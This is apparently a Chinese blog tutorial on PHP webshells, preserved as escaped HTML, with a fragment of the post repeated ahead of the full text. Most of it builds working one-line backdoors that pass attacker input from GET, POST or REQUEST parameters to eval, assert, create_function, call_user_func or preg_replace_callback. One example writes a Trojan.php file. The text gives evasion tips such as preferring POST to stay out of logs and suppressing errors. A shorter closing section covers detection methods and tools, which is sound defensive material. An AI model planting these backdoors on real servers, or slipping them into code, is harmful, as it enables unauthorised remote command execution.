class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class=\"line\"></span><br><span class=\"line\">@call_user_func(assert,$_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200911104416978.png\" alt=\"image-20200911104416978\"></p>\n<p>更换7.1.20尝试，无法显示phpinfo信息</p>\n<p><img src=\"/images/webshell/image-20200911104522817.png\" alt=\"image-20200911104522817\"></p>\n<p>这个禁用特性其实是从 php 7.1 版本开始，所以 <code>call_user_func + assert</code> 构造的一句话木马在 php 7.0 版本及以下可以使用。</p>\n<h5 id=\"preg-replace-callback\"><a href=\"#preg-replace-callback\" class=\"headerlink\" title=\"preg_replace_callback\"></a>preg_replace_callback</h5><p> <code>preg_replace /e</code> 函数写 webshell，因为此函数5.5.0及以上版本已经被弃用了。使用 preg_replace_callback() 代替。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,$_GET[&#39;cmd&#39;]);</span><br><span class=\"line\"></span><br><span class=\"line\">preg_replace_callback(&#39;&#x2F;.+&#x2F;i&#39;, create_function(&#39;$arr&#39;, &#39;return assert($arr[0]);&#39;), $_REQUEST[&#39;cmd&#39;]);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>此 webshell 的原理为：通过 <code>create_function</code> “创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。</p>\n<p><img src=\"/images/webshell/image-20200911105751006.png\" alt=\"image-20200911105751006\"></p>\n<h5 id=\"file-put-contents\"><a href=\"#file-put-contents\" class=\"headerlink\" title=\"file_put_contents\"></a>file_put_contents</h5><p>webshell 调试三部曲：</p>\n<ol>\n<li>把函数写在 php 文件中，看能否执行</li>\n<li>写成 <code>$_GET[&#39;&#39;]</code> 方式传入命令，看能否执行</li>\n<li>写成 <code>$_POST[&#39;&#39;]</code>方式传入命令，能能否执行命令<br><code>注：</code>2、3步可以合成通过<code>$_REQUEST[&#39;&#39;]</code>方法传入命令。</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,$_GET[&#39;cmd&#39;]);</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;preg_replace_callback(&#39;&#x2F;.+&#x2F;i&#39;, create_function(&#39;$arr&#39;, &#39;return assert($arr[0]);&#39;), $_REQUEST[&#39;cmd&#39;]);</span><br><span class=\"line\"></span><br><span class=\"line\">$test&#x3D;&#39;&lt;?php $a&#x3D;$_POST[&quot;cmd&quot;];assert($a); ?&gt;&#39;;</span><br><span class=\"line\">file_put_contents(&quot;Trojan.php&quot;, $test);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上面这个 webshell 利用函数生成 <code>Trojan.php</code> 木马文件。<br><code>file_put_contents</code> 函数：生成一个文件。第一个参数是文件名，第二个参数是文件的内容。</p>\n<p><img src=\"/images/webshell/image-20200911110201716.png\" alt=\"image-20200911110201716\"></p>\n<p><img src=\"/images/webshell/image-20200911110325971.png\" alt=\"image-20200911110325971\"></p>\n<p>如上图所示：命令成功执行</p>\n<h5 id=\"exec\"><a href=\"#exec\" class=\"headerlink\" title=\"exec\"></a>exec</h5><p>exec()功能是将命令作为参数，但不输出结果。如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">exec(&quot;ls&quot;)</span><br><span class=\"line\">&#x2F;&#x2F;echo exec(&quot;ls&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>无法回显，使用<code>exec()</code>函数执行echo命令，只会输出最后一行命令结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;exec(&quot;ls&quot;)</span><br><span class=\"line\">echo exec(&quot;ls&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200911111810853.png\" alt=\"image-20200911111810853\"></p>\n<p>如果指定了第二个参数，则返回结果为数组。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;exec(&quot;ls&quot;)</span><br><span class=\"line\">exec(&quot;ls&quot;,$array);</span><br><span class=\"line\">print_r($array);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/images/webshell/image-20200911111954897.png\" alt=\"image-20200911111954897\"></p>\n<h5 id=\"shell-exec\"><a href=\"#shell-exec\" class=\"headerlink\" title=\"shell_exec\"></a>shell_exec</h5><p>shell_exec()函数类似于exec()，但是，其整个输出结果为字符串。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo shell_exec(&quot;ls -al&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200911112228548.png\" alt=\"image-20200911112228548\"></p>\n<h5 id=\"passthru\"><a href=\"#passthru\" class=\"headerlink\" title=\"passthru\"></a>passthru</h5><p>passthru()执行一个命令并返回原始格式的输出.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">passthru(&quot;ls -l&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200911112637207.png\" alt=\"image-20200911112637207\"></p>\n<h4 id=\"检测手段\"><a href=\"#检测手段\" class=\"headerlink\" title=\"检测手段\"></a>检测手段</h4><h5 id=\"静态检测\"><a href=\"#静态检测\" class=\"headerlink\" title=\"静态检测\"></a>静态检测</h5><p>攻击者入侵服务器，使用Webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测。</p>\n<p>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，且误报、漏报率会比较高，但如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。</p>\n<p>缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。对于单站点的网站，用静态检测还是有很大好处，配合人工，能快速定位webshell，但是如果是一个成千上万站点的大型企业呢，这个时候再人肉那工作量可就大了。</p>\n<p>因此用这样一种思路：强弱特征。即把特征码分为强弱两种特征，强特征命中则必是webshell；弱特征由人工去判断。加入一种强特征，即把流行webshell用到的特征作为强特征重点监控，一旦出现这样的特征即可确认为webshell立即进行响应。要解决误报和漏报，就不能拘泥于代码级别了。</p>\n<p>同时结合文件系统。结合文件的属性来判断，比如apache是noboy启动的，webshell的属主必然也是nobody，如果我的Web目录无缘无故多了个nobody属主的文件，这里就有问题了。最理想的办法是需要制度和流程来建设一个web目录唯一发布入口，控制住这个入口，非法进来的Web文件自然可以发现。</p>\n<h5 id=\"动态检测\"><a href=\"#动态检测\" class=\"headerlink\" title=\"动态检测\"></a>动态检测</h5><p>Webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。</p>\n<p>Webshell传到服务器了，总要去执行它，Webshell执行时刻表现出来的特征，我们称为动态特征。Webshell通信是HTTP协议。只要我们把Webshell特有的HTTP请求/响应做成特征库，加到IDS里面去检测所有的HTTP请求就好了。</p>\n<p>webshell起来如果执行系统命令的话，会有进程。Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。</p>\n<h5 id=\"日志检测\"><a href=\"#日志检测\" class=\"headerlink\" title=\"日志检测\"></a>日志检测</h5><p>访问Webshell一般不会在系统日志中留下记录，但是会在网站的<code>web日志</code>中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p>\n<p>例如：一个平时是GET的请求改用POST请求并且返回代码为200、某个页面的访问者IP、访问时间具有规律性等。</p>\n<h4 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h4><p>以上介绍了部分检测手段，当然也少不了一些自动化工具(如下)，但是还需人工协助实现对Webshell检测的误报率。</p>\n<p><a href=\"https://github.com/he1m4n6a/findWebshell\">findWebshell</a></p>\n<p>一款本地检测Webshell工具，基本Webshell均可检测。可down到本地测试。检测脚本使用python编写。</p>\n<p><a href=\"http://www.d99net.net/News.asp?id=47\">D盾</a></p>\n<p>一款Windows客户端检测Webshell检测工具。较多人使用，具体使用下载本地测试即可。</p>\n<p><a href=\"https://www.shellpub.com/\">河马</a></p>\n<p>官网介绍：专注webshell查杀研究。拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p>\n<p><a href=\"http://www.safedog.cn/\">安全狗</a></p>\n<p>网站、服务器的检测，同时可以支持安全攻击防御，webshell检测等功能。</p>\n<h4 id=\"Referer\"><a href=\"#Referer\" class=\"headerlink\" title=\"Referer\"></a>Referer</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;02aac12e459f</span><br><span class=\"line\">http:&#x2F;&#x2F;blog.leanote.com&#x2F;post&#x2F;snowming&#x2F;2e1ab18dfa80</span><br><span class=\"line\">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;he1m4n6a&#x2F;p&#x2F;9245155.html</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h4><p>Web：指的是在Web服务器，而shell是用脚本语言编写的脚本程序，Webshell就是就是Web的一个管理工具，可以对Web服务器进行操作的权限，也叫webadmin。</p>\n<p>Webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到Web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。</p>\n<h4 id=\"分类\"><a href=\"#分类\" class=\"headerlink\" title=\"分类\"></a>分类</h4><h5 id=\"编程语言\"><a href=\"#编程语言\" class=\"headerlink\" title=\"编程语言\"></a>编程语言</h5><p>Webshell根据编程语言可以分为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP木马</span><br><span class=\"line\">ASP木马</span><br><span class=\"line\">.NET木马</span><br><span class=\"line\">JSP木马</span><br><span class=\"line\">python动态网页</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h5><p>根据功能分为<code>大马</code>、<code>小马</code>、<code>打包马</code>、<code>脱裤马</code>；</p>\n<p>小马通常指的一句话木马，体积较小，例如：<code>&lt;%eval request(“pass”)%&gt;</code>通常把这句话写入一个文档里面，然后修改xx.asp或php后缀。然后上传至服务器上。eval方法将request(“pass”)转换成代码执行，request函数的作用是应用外部文件。这相当于一句话木马的客户端配置。</p>\n<p>大马通常体积比较大 一般50K以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序。</p>\n<h4 id=\"常用函数\"><a href=\"#常用函数\" class=\"headerlink\" title=\"常用函数\"></a>常用函数</h4><p>由以上Webshell功能介绍了解到，它们使用各编程语编写并上传到目标服务器上执行；尝试获取系统命令、及网站web权限。因此需要使用对应编程语言内系统函数。</p>\n<p>（PHP语言示例）</p>\n<h5 id=\"system\"><a href=\"#system\" class=\"headerlink\" title=\"system\"></a>system</h5><p>函数将命令作为参数，并输出结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">eval(system(&#39;date&#39;));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910191501727.png\" alt=\"image-20200910191501727\"></p>\n<p> PHP 中的<code>超全局变量</code>(如<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>、<code>$_COOKIE</code>）获取攻击者的指令输入。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">eval($tmp);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910192925561.png\" alt=\"image-20200910192925561\"></p>\n<p>这里还有点问题：</p>\n<ol>\n<li>使用了超全局变量 <code>$_GET</code> 来通过 get 方法获取用户的输入命令。但是 GET 方法有一些限制，第一是存在长度限制：特定的浏览器及服务器会对通过 get 方法提交的字符串有一定的限制。第二是当网站管理员查 log 的时候，会看到明文的 get 请求参数，容易被发现，相比之下， post 请求敏感内容不容易被发现。所以最好把 get 方法换成 post 方法。</li>\n<li>system 函数不应该被写进去。一方面是因为因为有时候 php 中的一些危险函数会被开发者或者网站管理人员禁用，我们可以先不写命令执行函数，攻击的时候可以自行选择更厉害的方法进行绕过。另一方面是写入了 system 这个一句话木马就只能执行命令了，但是不写的话通过使用不同的 payload 一个一句话木马其实啥都能做（就像一句话木马连上菜刀之后的功能），基本跟大马一样。</li>\n<li>在 eval 前面可以加一个 <code>@</code>，@是忽略可能出现的错误。</li>\n</ol>\n<p>因此最后形成的一句话木马：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">@eval($_POST[cmd]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910201443491.png\" alt=\"image-20200910201443491\"></p>\n<h5 id=\"assert\"><a href=\"#assert\" class=\"headerlink\" title=\"assert\"></a>assert</h5><p>assert 这个函数在 php 语言中是用来判断一个表达式是否成立。返回 true or false；assert 函数的参数会被执行，这跟 eval() 类似。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">assert(system(&quot;date&quot;));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910202300583.png\" alt=\"image-20200910202300583\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;post型</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">@assert($_POST[&#39;c&#39;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">给 assert() 函数传入字符串参数，这个特性在 7.2 禁用，在 8.0 版本时会被彻底删除。</span><br></pre></td></tr></table></figure>\n\n<p>注意：我们对一句话木马使用的一些 payload，比如 phpinfo() 或者 system(‘command’)，因为不是字符串，所以也就不受版本限制。</p>\n<p>如下所示：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910202837253.png\" alt=\"image-20200910202837253\"></p>\n<h5 id=\"create-function\"><a href=\"#create-function\" class=\"headerlink\" title=\"create_function\"></a>create_function</h5><p>在php中，函数<code>create_function</code>主要用来创建匿名函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string create_function(string $args, string $code)</span><br><span class=\"line\">string $args 变量部分</span><br><span class=\"line\">string $code 方法代码部分</span><br></pre></td></tr></table></figure>\n\n<p>注意当我们使用此匿名函数的时候，方法代码部分会被执行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">$tmp();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910203507277.png\" alt=\"image-20200910203507277\"></p>\n<p>构造一句话木马</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">$tmp();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>把用户传递的数据生成一个函数 tmp()，然后再执行 tmp()：</p>\n<p><img src=\"/images/webshell/image-20200910203732113.png\" alt=\"image-20200910203732113\"></p>\n<h5 id=\"call-user-func\"><a href=\"#call-user-func\" class=\"headerlink\" title=\"call_user_func\"></a>call_user_func</h5><p><code>call_user_func</code> 这个函数可以调用其它函数，被调用的函数是 <code>call_user_func</code> 的第一个函数，被调用的函数的参数是 <code>call_user_func</code> 的第二个参数。这样的一个语句也可以完成一句话木马。一些被 waf 拦截的木马可以配合这个函数绕过 waf。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910205446756.png\" alt=\"image-20200910205446756\"></p>\n<p>其实所有的一句话木马都由两部分组成：</p>\n<ol>\n<li>接收攻击者输入</li>\n<li>命令执行函数</li>\n</ol>\n<p>在<code>PHP Version 7.3.4</code>，webshell 是无法回显的.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span 